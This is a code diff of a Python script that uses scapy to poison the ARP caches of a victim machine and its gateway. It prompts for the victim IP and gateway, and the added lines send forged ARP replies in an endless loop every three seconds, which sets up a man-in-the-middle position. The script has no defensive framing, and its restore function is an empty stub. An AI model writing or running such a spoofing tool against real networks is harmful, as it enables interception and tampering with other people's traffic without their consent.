@@ -1,6 +1,7 @@
 from scapy.all import *
 import os
 import sys
+import time
 
 def sp(vfrom, vto, vtohw):
     arps = ARP()
@@ -8,6 +9,8 @@ def sp(vfrom, vto, vtohw):
     arps.pdst = vto
     arps.hwdst = vtohw
     arps.op = 2
+    send(arps, verbose=False)
+    print('ARP SENT FROM ' + vfrom + ' TO ' + vto + ' ' + vtohw)
     
 def spoof(victim, gateway):
     arps1 = ARP(pdst=victim)
@@ -19,9 +22,18 @@ def spoof(victim, gateway):
         hw2 = r2.hwsrc
         sp(gateway, victim, hw1)
         sp(victim, gateway, hw2)
+        print('TARGET SPOOFED !')
     
 def restore(victim, gateway):
     print()
     
 v = str(input('ENTER VICTIM IP ADDRESS : '))
 g = str(input('ENTER GATEWAY : '))
+c = str(input(v+'> '))
+
+try:
+   while True:
+       spoof(v, g)
+       time.sleep(3)
+except Exception as e:
+    print('THE PROBLEM IS : ' + e)
